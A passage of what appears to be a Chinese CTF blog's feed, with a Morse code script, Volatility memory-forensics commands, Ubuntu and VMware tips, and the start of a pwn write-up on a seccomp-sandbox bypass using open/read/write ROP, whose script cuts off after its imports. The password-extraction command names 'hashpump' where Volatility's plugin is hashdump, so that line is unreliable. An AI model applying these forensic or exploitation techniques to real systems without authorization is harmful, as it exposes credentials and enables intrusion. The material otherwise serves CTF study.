punctuation">:</span> <span class="token string">'.....'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'-....'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'--...'</span><span class="token punctuation">,</span>                     <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'---..'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'----.'</span><span class="token punctuation">,</span>                     <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.-'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">:</span> <span class="token string">'---...'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">:</span> <span class="token string">'--..--'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">:</span> <span class="token string">'-.-.-.'</span><span class="token punctuation">,</span>                     <span class="token string">'?'</span><span class="token punctuation">:</span> <span class="token string">'..--..'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'-...-'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">:</span> <span class="token string">'.----.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'!'</span><span class="token punctuation">:</span> <span class="token string">'-.-.--'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'-....-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'..--.-'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'.-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'-.--.'</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'-.--.-'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">:</span> <span class="token string">'...-..-'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token string">'.--.-.'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.'</span><span class="token punctuation">,</span>                     <span class="token punctuation">&#125;</span>      <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      cipher <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> s <span class="token keyword">in</span> message<span class="token punctuation">:</span>          cipher <span class="token operator">+=</span> MORSE_CODE_DICT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>          <span class="token keyword">if</span> s <span class="token operator">!=</span> message<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>              cipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 每加密一个字符用空格隔开  </span>    <span class="token keyword">return</span> cipher      <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      message <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 在末尾添加额外空间以访问最后一个摩斯密码  </span>    decipher <span class="token operator">=</span> <span class="token string">''</span>      citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">global</span> i      <span class="token keyword">for</span> letter <span class="token keyword">in</span> message<span class="token punctuation">:</span>          <span class="token keyword">if</span> letter <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">:</span>              i <span class="token operator">=</span> <span class="token number">0</span>              citext <span class="token operator">+=</span> letter          <span class="token keyword">else</span><span class="token punctuation">:</span>              i <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 如果i=1表示一个新字符  </span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment"># 如果i=2表示一个新单词  </span>                decipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 添加空格来分隔单词  </span>            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 使用它们的值访问密钥（加密的反向）  </span>                decipher <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>citext<span class="token punctuation">)</span><span class="token punctuation">]</span>                  citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">return</span> decipher      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"           摩斯加解密系统             "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">杂项中的一些脚本，有的在线网站也可以实现，不过还是自己总结了一些，可以方便根据自己的需求修改源码</summary>
    
    
    
    <category term="便捷算法" scheme="https://www.4ss1du0us.cn/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>内存取证</title>
    <link href="https://www.4ss1du0us.cn/2023/055090002e.html"/>
    <id>https://www.4ss1du0us.cn/2023/055090002e.html</id>
    <published>2023-05-08T07:56:58.000Z</published>
    <updated>2023-05-11T05:27:22.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="volatility-的安装"><a href="#volatility-的安装" class="headerlink" title="volatility 的安装"></a>volatility 的安装</h2><blockquote><p>Volatility 是一款开源的内存取证分析工具，支持 Windows、Linux、Mac、Android 等多类型操作系统系统的内存取证方式。该工具由 python 开发，<strong>volatility2 支持 python2</strong>、<strong>volatility3 支持 python3</strong> 环境</p></blockquote><ul><li><p>通过 snap 安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> volatility-phocean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过 git 安装 volatility3（需先安装 python3 环境）</p></li></ul><blockquote><p>Github地址：<a href="https://github.com/volatilityfoundation/volatility3">https://github.com/volatilityfoundation/volatility3</a></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/volatilityfoundation/volatility3<span class="token builtin class-name">cd</span> volatility3pip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements-minimal.txt<span class="token function">sudo</span> python3 setup.py build <span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 vol.py <span class="token parameter variable">-h</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="volalitily-的使用"><a href="#volalitily-的使用" class="headerlink" title="volalitily 的使用"></a>volalitily 的使用</h2><blockquote><p>常见的取证文件后缀名为：raw、vmem、img、dmg</p><p>命令中 <code>volatility</code> 可以替换为 <code>python3 vol.py</code></p></blockquote><hr><h3 id="获取系统基本信息"><a href="#获取系统基本信息" class="headerlink" title="获取系统基本信息"></a>获取系统基本信息</h3><blockquote><p><strong>首先必须通过此命令获取系统版本信息，如果操作系统错误，是无法正确读取内存信息的</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> xxxvolatility <span class="token parameter variable">-f</span> 镜像名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'jpg|png|jpeg|bmp|gif'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 dumpfiles <span class="token parameter variable">-Q</span> 内存地址 --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="列出进程信息"><a href="#列出进程信息" class="headerlink" title="列出进程信息"></a>列出进程信息</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本  pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取进程内容"><a href="#提取进程内容" class="headerlink" title="提取进程内容"></a>提取进程内容</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 memdump <span class="token parameter variable">-p</span> 进程的PID <span class="token parameter variable">-D</span> 保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取浏览器浏览历史"><a href="#获取浏览器浏览历史" class="headerlink" title="获取浏览器浏览历史"></a>获取浏览器浏览历史</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取内存中的注册表"><a href="#获取内存中的注册表" class="headerlink" title="获取内存中的注册表"></a>获取内存中的注册表</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 screenshot --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取-cmd-输入"><a href="#获取-cmd-输入" class="headerlink" title="获取 cmd 输入"></a>获取 cmd 输入</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看-cmd-执行的文件"><a href="#查看-cmd-执行的文件" class="headerlink" title="查看 cmd 执行的文件"></a>查看 cmd 执行的文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取账户密码"><a href="#提取账户密码" class="headerlink" title="提取账户密码"></a>提取账户密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hashpump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscan<span class="token operator">|</span><span class="token function">grep</span> ESTABLISHED   <span class="token comment"># 查看已建立的网络连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="查看桌面文件"><a href="#查看桌面文件" class="headerlink" title="查看桌面文件"></a>查看桌面文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Desktop"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">使用 Volatility 进行内存取证的一些指令，包括安装和具体使用</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu22.04操作指令</title>
    <link href="https://www.4ss1du0us.cn/2023/057645d679.html"/>
    <id>https://www.4ss1du0us.cn/2023/057645d679.html</id>
    <published>2023-05-02T07:23:24.000Z</published>
    <updated>2023-05-11T05:21:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改-host-并清除-DNS-缓存"><a href="#修改-host-并清除-DNS-缓存" class="headerlink" title="修改 host 并清除 DNS 缓存"></a>修改 host 并清除 DNS 缓存</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts<span class="token comment"># 检查目前的缓存大小</span>resolvectl statistics<span class="token comment"># 清理缓存，清理完后 Current Cache Size 变为 0</span>resolvectl flush-caches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="为应用创建桌面图标"><a href="#为应用创建桌面图标" class="headerlink" title="为应用创建桌面图标"></a>为应用创建桌面图标</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> 程序名.desktop<span class="token comment"># 写入如下内容：</span>-------------------------------------------<span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Name</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Exec</span><span class="token operator">=</span>  <span class="token comment"># 程序路径</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>  <span class="token comment"># 应用的图标，形如 xxx.png</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Developer<span class="token punctuation">;</span>-------------------------------------------<span class="token comment"># 增加执行权限</span><span class="token function">sudo</span> <span class="token function">chmod</span> a+x 程序名.desktop<span class="token comment"># 在桌面图标上右键，选择 "允许运行"，双击图标验证是否能成功打开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">一些日常使用 Ubuntu 的指令</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>从物理机拖到Linux虚拟机中的文件消失了？</title>
    <link href="https://www.4ss1du0us.cn/2023/0441d1faf8.html"/>
    <id>https://www.4ss1du0us.cn/2023/0441d1faf8.html</id>
    <published>2023-04-29T12:36:24.000Z</published>
    <updated>2023-05-11T05:27:40.735Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>有时候虚拟机像是 bug 了一样，明明安装了 VMtools，从物理机拖放文件还是会失败：</p><ol><li><p>如果直接将文件拖进虚拟机会显示 🚫，不妨试试在物理机中将文件复制后粘贴到虚拟机哦（如果还是不行，试试重装  VMtools）</p></li><li><p>但有时候将文件拖进虚拟机没有显示 🚫，文件也拖放成功了，但文件却并没有出现在对应的文件夹中，当然这就是本文要解决的问题</p></li></ol></blockquote><ul><li>以物理机往 Ubuntu 虚拟机拖放 <code>CLion</code> 为例：</li></ul><p><img src="https://s2.loli.net/2023/04/29/jl61ciOaBJDPokC.png" alt="从物理机拖到Linux虚拟机中的文件消失了1.png"></p><ol><li>可以看到，虚拟机没有提示 🚫，拖放操作是没有问题的</li></ol><p><img src="https://s2.loli.net/2023/04/29/LDc5XKg2PEmx3eS.png" alt="从物理机拖到Linux虚拟机中的文件消失了2.png"></p><ol start="2"><li>拖放后，物理机开始复制文件到 Ubuntu 虚拟机</li></ol><p><img src="https://s2.loli.net/2023/04/29/7rcTgKphPxoLAUX.png" alt="从物理机拖到Linux虚拟机中的文件消失了3.png"></p><ol start="3"><li>但是发现复制结束后，桌面上什么都没有，左上角还有个像卡 bug 了一样的白图标</li></ol><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>其实，如果在拖放文件到虚拟机的时候没有显示 🚫，并且会有一个 <code>正在将文件 &quot;xxx&quot; 复制到虚拟机</code> 的弹窗，那说明文件是已经成功移到虚拟机了，只是没有移到你想放的文件夹下</p><p><strong>VMware Workstation 会将用户拖放到虚拟机的文件存放在一个叫 <code>drag_and_drop</code> 的文件夹内，只需手动操作一下即可</strong></p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol><li>打开主目录，并在主目录里打开终端（或直接 <code>cd ~</code>）<br><code>ls -a</code> 查看主目录下所有文件</li></ol><p><img src="https://s2.loli.net/2023/04/29/t9r2JZY5xjzCBkX.png" alt="从物理机拖到Linux虚拟机中的文件消失了4.png"></p><ol start="2"><li>进到名为 <code>.cache</code> 的隐藏文件夹，一路 <code>ls -a</code> 查看，并进到 <code>~/.cache/vmware/drag_and_drop</code> 目录下</li></ol><p><img src="https://s2.loli.net/2023/04/29/kj7Y4yRGuv9fFa1.png" alt="从物理机拖到Linux虚拟机中的文件消失了5.png"></p><ol start="3"><li>这个目录下有 <code>n</code> 个文件夹，<strong>这些文件夹里存放的就是用户从物理机拖到虚拟机里的东西</strong>（<em>一般最左边的就是最近一次拖放的</em>）</li></ol><p><img src="https://s2.loli.net/2023/04/29/lTyXg2kAce9Vb8K.png" alt="从物理机拖到Linux虚拟机中的文件消失了6.png"></p><ol start="4"><li>只需将这里面对应的文件移出去即可<br>例如我将 <code>CLion</code> 移到主目录下：<code>mv ./CLion-2022.3.1.tar.gz ~</code></li></ol><p><img src="https://s2.loli.net/2023/04/29/hawdfzIxFrcSvHy.png" alt="从物理机拖到Linux虚拟机中的文件消失了7.png"></p><ol start="5"><li>现在查看主目录的文件夹，就能看到你拖到虚拟机里的文件了</li></ol><hr><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h3 id="定期清理"><a href="#定期清理" class="headerlink" title="定期清理"></a>定期清理</h3><ol><li><p>因为每次拖放文件到虚拟机都会在 <code>~/.cache/vmware/drag_and_drop</code> 目录下生成一个文件，长此以往，会特别占用虚拟机的空间</p></li><li><p>所以我们可以定期到 <code>~/.cache/vmware/drag_and_drop</code> 目录下执行 <code>rm -rf *</code>，删除 <code>drag_and_drop</code> 目录下的全部文件</p></li></ol><blockquote><p>在 Windows 虚拟机中同理，<code>Win + R</code> 打开 <code>运行</code>，在 <code>运行</code> 中输入 <code>%temp%</code><br>或者打开 <code>C:\Users\用户名\AppData\Local\Temp</code> 路径<br>在 Temp 文件夹中有一个名为 <code>vmware-用户名</code> 的文件夹，里面存放的也是拖放到虚拟机中的文件</p></blockquote><hr><h3 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h3><blockquote><p>如果往虚拟机中拖放文件、复制文件经常出 bug，也可以通过共享文件夹来向虚拟机传送文件<br>（但是这种方式将物理机和虚拟机联系到了一起，我也不知道开启共享文件夹后，虚拟机病毒会不会影响到物理机）</p></blockquote><ol><li>首先开启共享文件夹，<code>虚拟机 --&gt; 设置 --&gt; 选项 --&gt; 共享文件夹</code></li></ol><p><img src="https://s2.loli.net/2023/04/29/nXZsIdf1e4ylmWH.png" alt="从物理机拖到Linux虚拟机中的文件消失了8.png"></p><ol start="2"><li>设置<code>总是启用</code>，<code>添加</code>共享文件夹，选择物理机上的一个文件夹，作为物理机和虚拟机的共享文件夹</li></ol><p><img src="https://s2.loli.net/2023/04/29/ThLt4MIoACycplj.png" alt="从物理机拖到Linux虚拟机中的文件消失了9.png"></p><ol start="3"><li><p>后面的保持默认设置即可</p></li><li><p>打开终端，输入 <code>vmware-hgfsclient</code> 检测是否设置成功，我设置的共享文件夹名字叫 <code>&quot;ShareFolder&quot;</code></p></li></ol><p><img src="https://s2.loli.net/2023/04/29/NgerK1vmwpTikWZ.png" alt="从物理机拖到Linux虚拟机中的文件消失了10.png"></p><ol start="5"><li>一般来说，Linux 中的共享文件夹在目录 <code>/mnt/hgfs</code> 下，也可以在如下位置查看：</li></ol><p><img src="https://s2.loli.net/2023/04/29/YLyIqK6Jk8wxzgO.png" alt="从物理机拖到Linux虚拟机中的文件消失了11.png"></p><ol start="6"><li><p>你可以通过把文件放在物理机的 <code>ShareFolder</code> 文件夹下，然后 Ubuntu 虚拟机就可以访问到了</p></li><li><p>如果在目录 <code>/mnt/hgfs</code> 下，还是访问不到你放置的文件<br>或者 <code>cd /mnt/hgfs</code> 后 <code>ls -a</code> 发现什么都没有<br>在终端输入：<code>vmhgfs-fuse .host:/ /mnt/hgfs</code>（将物理机的共享文件夹挂载到目录 <code>/mnt/hgfs</code> 下）</p></li><li><p>退出目录，重新进到目录 <code>/mnt/hgfs</code> 下，即可发现正常访问</p></li></ol><p><img src="https://s2.loli.net/2023/04/29/VgXTaxEJUAfvFKd.png" alt="从物理机拖到Linux虚拟机中的文件消失了12.png"></p><p><img src="https://s2.loli.net/2023/04/29/vpMu4rTNwhV9DAW.png" alt="从物理机拖到Linux虚拟机中的文件消失了13.png"></p><blockquote><p>如果是 Windows 系列的虚拟机，查看共享文件夹就更简单了，可以直接挂载到 <code>&quot;网络&quot;</code> 中，然后进行查看<br>这里就不解释了</p></blockquote><p><img src="https://s2.loli.net/2023/04/29/eS6UdO5XzmG9i1l.png" alt="从物理机拖到Linux虚拟机中的文件消失了14.png"></p>]]></content>
    
    
    <summary type="html">有时候明明安装了 VMtools，却发现文件有时还是无法拖进 Linux 虚拟机，或者拖进虚拟机后文件却并没有出现在对应的文件夹里，不要慌，其实虚拟机没有问题，只需要简单操作一下</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-Random</title>
    <link href="https://www.4ss1du0us.cn/2023/042a1afe0d.html"/>
    <id>https://www.4ss1du0us.cn/2023/042a1afe0d.html</id>
    <published>2023-04-26T13:52:37.000Z</published>
    <updated>2023-05-12T13:41:06.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><hr><p><a href="https://www.nssctf.cn/problem/3722">（2023年4月16日）2023GDOUCTF-Random</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析程序：<br><img src="https://s2.loli.net/2023/05/12/BAaHRVyjl4wZcEi.png" alt="2023GDOUCTF-RANDOM1.png"></p></li><li><p>用 IDA 分析：<br><img src="https://s2.loli.net/2023/05/12/d5SLoEiwhNtbVZ3.png" alt="2023GDOUCTF-RANDOM2.png"><br>这个题也用到了猜伪随机数，猜对之后进到 <code>vulnerable()</code> 函数：<br><img src="https://s2.loli.net/2023/05/12/B3gCADmyiV7HNsj.png" alt="2023GDOUCTF-RANDOM3.png"><br>由于 <code>buf</code> 在栈上的长度是 0x20，这里是可以溢出的</p></li><li><p>看看字符串里有没有什么可以利用的<br><img src="https://s2.loli.net/2023/05/12/MBXNvsK96gGqaOV.png" alt="2023GDOUCTF-RANDOM5.png"><br>好像并没有</p></li><li><p>发现程序通过 <code>sandbox()</code> 函数开启了沙箱保护：<br><img src="https://s2.loli.net/2023/05/12/qzvaxCh75MTFP8H.png" alt="2023GDOUCTF-RANDOM4.png"><br>使用 <code>prctl()</code> 方式开启的沙箱<br>沙箱保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 <code>ROP</code> 的方式调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p></li><li><p>使用 <code>seccomp-tools</code> 检查一下程序的沙箱机制<br><img src="https://s2.loli.net/2023/05/12/3AeV9WopvD5zI14.png" alt="2023GDOUCTF-RANDOM6.png"><br><code>if (A != execve) goto 0005</code> 即 <code>return ALLOW</code>，所以程序禁用了 <code>execve</code>，而 <code>system()</code> 需要通过 <code>execve</code> 来实现</p></li><li><p>因此本题需要使用 ORW<code>（O -- open，R -- read，W -- write）</code> 来绕过沙箱<br>① 首先通过 <code>ctypes</code> 绕过伪随机数校验，跳转到 <code>vulnerable()</code> 函数，但是这里不能通过溢出执行 shellcode 来提权，因为 <code>system()</code> 被沙箱 Ban 了<br>②<br>③<br>④<br>⑤ 然后用 <code>open()</code> 打开 flag，<code>read()</code> 读取 flag，<code>write()</code> 写出 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token 